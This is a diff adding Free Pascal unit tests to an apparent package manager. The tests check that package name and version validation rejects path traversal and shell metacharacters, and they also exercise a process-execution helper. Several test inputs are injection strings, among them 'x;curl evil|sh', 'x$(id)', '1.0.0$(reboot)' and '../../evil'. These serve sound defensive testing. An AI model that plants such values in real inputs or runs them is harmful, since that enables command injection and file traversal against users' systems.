@@ -106,6 +106,25 @@ type
     procedure TestForceFetchDefaultFalse;
   end;
 
+  { Package names and versions feed filesystem paths, registry URLs and
+    subprocess arguments; the charset must exclude path separators,
+    traversal sequences and shell metacharacters }
+  TTestPackageIdentifierValidation = class(TTestCase)
+  published
+    procedure TestValidNames;
+    procedure TestInvalidNames;
+    procedure TestValidVersions;
+    procedure TestInvalidVersions;
+  end;
+
+  TTestExecuteInDir = class(TTestCase)
+  published
+    procedure TestGetSelfExePathIsAbsoluteAndExists;
+    procedure TestRunsInGivenWorkingDirectory;
+    procedure TestCapturesOutput;
+    procedure TestReturnsExitCode;
+  end;
+
 implementation
 
 { TTestQuotePath }
@@ -589,6 +608,113 @@ begin
   AssertFalse('ForceFetch default is false', Args.ForceFetch);
 end;
 
+{ TTestPackageIdentifierValidation }
+
+procedure TTestPackageIdentifierValidation.TestValidNames;
+begin
+  AssertTrue('simple', TUtils.IsValidPackageName('fpgui'));
+  AssertTrue('hyphenated', TUtils.IsValidPackageName('fpgui-framework'));
+  AssertTrue('dotted', TUtils.IsValidPackageName('my.lib'));
+  AssertTrue('underscored', TUtils.IsValidPackageName('my_lib'));
+  AssertTrue('digits', TUtils.IsValidPackageName('lib2'));
+  AssertTrue('single char', TUtils.IsValidPackageName('x'));
+  AssertTrue('mixed case', TUtils.IsValidPackageName('MyLib'));
+end;
+
+procedure TTestPackageIdentifierValidation.TestInvalidNames;
+begin
+  AssertFalse('empty', TUtils.IsValidPackageName(''));
+  AssertFalse('forward slash', TUtils.IsValidPackageName('a/b'));
+  AssertFalse('backslash', TUtils.IsValidPackageName('a\b'));
+  AssertFalse('traversal', TUtils.IsValidPackageName('../../evil'));
+  AssertFalse('leading dot', TUtils.IsValidPackageName('.hidden'));
+  AssertFalse('leading hyphen', TUtils.IsValidPackageName('-flag'));
+  AssertFalse('semicolon', TUtils.IsValidPackageName('x;curl evil|sh'));
+  AssertFalse('space', TUtils.IsValidPackageName('my lib'));
+  AssertFalse('dollar', TUtils.IsValidPackageName('x$(id)'));
+  AssertFalse('backtick', TUtils.IsValidPackageName('x`id`'));
+  AssertFalse('ampersand', TUtils.IsValidPackageName('a&&b'));
+end;
+
+procedure TTestPackageIdentifierValidation.TestValidVersions;
+begin
+  AssertTrue('semver', TUtils.IsValidPackageVersion('1.0.0'));
+  AssertTrue('prerelease', TUtils.IsValidPackageVersion('2.0.0-rc.1'));
+  AssertTrue('build metadata', TUtils.IsValidPackageVersion('1.0.0+build5'));
+  AssertTrue('two part', TUtils.IsValidPackageVersion('1.0'));
+end;
+
+procedure TTestPackageIdentifierValidation.TestInvalidVersions;
+begin
+  AssertFalse('empty', TUtils.IsValidPackageVersion(''));
+  AssertFalse('leading letter', TUtils.IsValidPackageVersion('v1.0.0'));
+  AssertFalse('slash', TUtils.IsValidPackageVersion('1.0/../2'));
+  AssertFalse('shell expansion', TUtils.IsValidPackageVersion('1.0.0$(reboot)'));
+  AssertFalse('backtick', TUtils.IsValidPackageVersion('1.0`id`'));
+  AssertFalse('space', TUtils.IsValidPackageVersion('1.0 0'));
+  AssertFalse('semicolon', TUtils.IsValidPackageVersion('1.0;rm'));
+end;
+
+{ TTestExecuteInDir }
+
+procedure TTestExecuteInDir.TestGetSelfExePathIsAbsoluteAndExists;
+var
+  ExePath: string;
+begin
+  ExePath := TUtils.GetSelfExePath;
+  AssertTrue('Path should not be empty', ExePath <> '');
+  AssertTrue('Path should be absolute',
+    ExePath = ExpandFileName(ExePath));
+  AssertTrue('Path should point to an existing file', FileExists(ExePath));
+end;
+
+{$IFDEF UNIX}
+procedure TTestExecuteInDir.TestRunsInGivenWorkingDirectory;
+var
+  Output: string;
+  Code: Integer;
+begin
+  Code := TUtils.ExecuteProcessInDirWithCapture('pwd', [], '/tmp', Output);
+  AssertEquals('Exit code', 0, Code);
+  AssertEquals('Working directory', '/tmp', Trim(Output));
+end;
+
+procedure TTestExecuteInDir.TestCapturesOutput;
+var
+  Output: string;
+  Code: Integer;
+begin
+  Code := TUtils.ExecuteProcessInDirWithCapture('echo',
+    ['hello', 'world'], '/tmp', Output);
+  AssertEquals('Exit code', 0, Code);
+  AssertEquals('Captured output', 'hello world', Trim(Output));
+end;
+
+procedure TTestExecuteInDir.TestReturnsExitCode;
+var
+  Output: string;
+  Code: Integer;
+begin
+  Code := TUtils.ExecuteProcessInDirWithCapture('false', [], '/tmp', Output);
+  AssertEquals('Non-zero exit code should be propagated', 1, Code);
+end;
+{$ELSE}
+procedure TTestExecuteInDir.TestRunsInGivenWorkingDirectory;
+begin
+  Ignore('Unix-only test');
+end;
+
+procedure TTestExecuteInDir.TestCapturesOutput;
+begin
+  Ignore('Unix-only test');
+end;
+
+procedure TTestExecuteInDir.TestReturnsExitCode;
+begin
+  Ignore('Unix-only test');
+end;
+{$ENDIF}
+
 initialization
   RegisterTest(TTestQuotePath);
   RegisterTest(TTestFPCExecutable);
@@ -598,5 +724,7 @@ initialization
   RegisterTest(TTestBlaiseIncremental);
   RegisterTest(TTestCacheDirectories);
   RegisterTest(TTestCLIOfflineFlag);
+  RegisterTest(TTestPackageIdentifierValidation);
+  RegisterTest(TTestExecuteInDir);
 
 end.
